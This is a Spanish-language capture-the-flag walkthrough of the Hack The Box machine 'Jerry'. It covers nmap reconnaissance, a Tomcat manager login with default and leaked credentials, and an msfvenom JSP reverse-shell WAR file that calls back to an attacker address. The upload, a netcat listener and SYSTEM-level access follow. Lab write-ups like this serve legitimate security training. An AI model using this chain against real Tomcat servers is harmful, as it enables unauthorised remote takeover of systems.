---
layout: single
title: Jerry - Hack The Box
excerpt: "Esta es una máquina bastante sencilla, realizada en windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un payload en lugar de un exploit para crear una Backdoor en la maquina para que nos devuelva una shell."
date: 2023-01-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-jerry/jerry_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - Tomcat
  - Reverse Shell
  - OSCP Style
---
![](/assets/images/htb-writeup-jerry/jerry_logo.png)
Esta es una máquina bastante sencilla, realizada en windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un payload en lugar de un exploit, para crear una Backdoor en la maquina para que nos devuelva una shell.

# Recopilación de Información
## Traza ICMP
```
ping -c 4 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=134 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=137 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=127 time=134 ms
64 bytes from 10.10.10.95: icmp_seq=4 ttl=127 time=133 ms

--- 10.10.10.95 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 132.645/134.479/137.492/1.823 ms
```
Observamos que la máquina esta conectada, además vemos el TTL y vemos que es una maquina Windows.

## Escaneo de Puertos
Realizamos un escaneo de puertos para ver cuales estan abiertos, una vez realizado haremos un escaneo de servicios. Vemos solamente un puerto abierto, que es el 8080, investigando un poco vemos que este puerto es usado para la web pero es necesario activar un proxy.
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 12:30 CST
Initiating SYN Stealth Scan at 12:30
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
Increasing send delay for 10.10.10.95 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
Completed SYN Stealth Scan at 12:30, 31.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.95
Host is up, received user-set (0.60s latency).
Scanned at 2023-01-15 12:30:17 CST for 31s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
           Raw packets sent: 131090 (5.768MB) | Rcvd: 14 (608B)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP SYN port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envio de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

## Escaneo de Servicios
Una vez encontrados los puertos, analizamos los servicios que operan en estos. En este caso solo se encontro 1 abierto asi que vamos a analizarlo:
```
nmap -sC -sV -p8080 10.10.10.95 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 12:36 CST
Nmap scan report for 10.10.10.95
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```
* -sC: Para indicar un lanzamiento de scripts basicos de reconocimiento.
* -sV: Para identificar los servicios/version que estan activos en los puertos que se analicen.
* -p: Para indicar puertos especificos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Vemos que el servicio que opera es el Tomcat, ademas de ver que es una pagina web podemos analizarla tambien con la herramienta "whatweb" siendo que nos dara el mismo resultado pero con un poco más de información. OJO, en este caso hay que indicarle el puerto, esto se hace porque el puerto esta ocupando proxy, si no fuera ese caso, solo se pondria la ip de la maquina y listo:
```
whatweb http://10.10.10.95:8080/
http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
```
# Analisis de Vulnerabilidades
## Investigación del Servicio
Bueno pero, ¿que chuchas es el servicio Tomcat? pues vamos a investigarlo:

**Apache Tomcat (o, sencillamente, Tomcat) es un contenedor de servlets que se puede usar para compilar y ejecutar aplicaciones web realizadas en Java. Implementa y da soporte tanto a servlets como a páginas JSP (Java Server Pages) o Java Sockets.**

Entonces entendemos que usa java para trabajar la aplicación web, podemos usar esto para encontrar el exploit indicado y acceder a la maquina. Pero antes vamos a analizar la pagina web:

Una vez entramos vemos que nos manda a una pagina por default del servicio Tomcat:

![](/assets/images/htb-writeup-jerry/Captura1.png)

Podemos observar que hay 3 "botones" que cada vez que intentamos acceder nos pide un usuario y contraseña, obviamente no los tenemos asi que vamos a probar algunas credenciales por defecto que tiene tomcat (namas pon en san google credenciales por defecto de tomcat y yasta xd):
* tomcat - tomcat
* admin - password
* admin - tomcat

Ninguna sirve entonces vamos a cancelar el login para ver que más podemos hacer...aguanta, nos redirigio a una pagina pero hay algo raro ahi:

![](/assets/images/htb-writeup-jerry/Captura2.png)

Un usuario y contraseña...vamos a usarlos y listo ya accedimos xd:

![](/assets/images/htb-writeup-jerry/Captura3.png)

Analizando un poco la pagina, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que podemos usar esto para buscar un exploit que podamos usar pues lo que podemos subir es una reverse shell y con eso obtenemos una shell conectada, osease que lo que estamos haciendo es una **BackDoor**.

## Buscando y Configurando un Payload
Si bien antes usamos **searchsploit** para buscar exploits en la base de datos de Metasploit para usarlos, esta vez vamos a usar la herramienta **msfvenom** que por asi decirlo es similar, la diferencia radica en que aqui le podemos indicar los mismos parametros que en Metasploit además de que usa **Payloads** en lugar de **Exploits**.

Ahora para buscar los payloads debemos usar el siguiente comando, especificando que buscamos los tipo **Java**:
```
msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shel
```
Vamos a ocupar este payload: **java/jsp_shell_reverse_tcp** que como su descripcion nos dice, se va a conectar de la maquina victima hacia nosotros spawneando una shell. Para usar el exploit solamente debemos indicarle 3 cosillas:
* Nuestra IP con LHOST
* Un puerto con RHOST
* Que se guarde en archivo tipo war con -f war
Y ya solamente lo podemos guardar con un nombre en especifico, yo lo llame shell.war:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f war -o shell.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes
Saved as: shell.war
```
Con esto ya nos creo un archivo .war que es lo que admite la aplicacion web, ahora debemos subirlo con la opción browser:

![](/assets/images/htb-writeup-jerry/Captura4.png)

Lo seleccionamos y ya lo subimos, ahi mismo observamos que el archivo es tipo **.war**.

![](/assets/images/htb-writeup-jerry/Captura5.png)

# Explotando Vulnerabilidades
## Accediendo a la Maquina
Una vez subido el archivo que creamos con el payload, que es una **Reverse Shell**, ya solamente debemos alzar una netcat y activar el payload:
```
rlwrap nc -nlvp 443
listening on [any] 443 ...
```
Le damos click al archivo **.war**:

![](/assets/images/htb-writeup-jerry/Captura6.png)

Y listo! Ya estamos dentro:
```
rlwrap nc -nlvp 443
listening on [any] 443 ...

connect to [10.10.14.10] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```
Y ya solamente es buscar las flags, que normalmente siempre estan alojadas en la carpeta usuarios, dentro del escritorio del usuario y del administrados:
```
:\apache-tomcat-7.0.88>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\

06/19/2018  03:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  05:52 PM    <DIR>          PerfLogs
06/19/2018  05:42 PM    <DIR>          Program Files
06/19/2018  05:42 PM    <DIR>          Program Files (x86)
06/18/2018  10:31 PM    <DIR>          Users
01/21/2022  08:53 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,418,688,000 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/18/2018  10:31 PM    <DIR>          Administrator
08/22/2013  05:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,418,688,000 bytes free

C:\Users>cd Administrator
cd Administrator

Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,418,688,000 bytes free
```
Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahi estara lo que buscamos:

```
C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
```
# FIN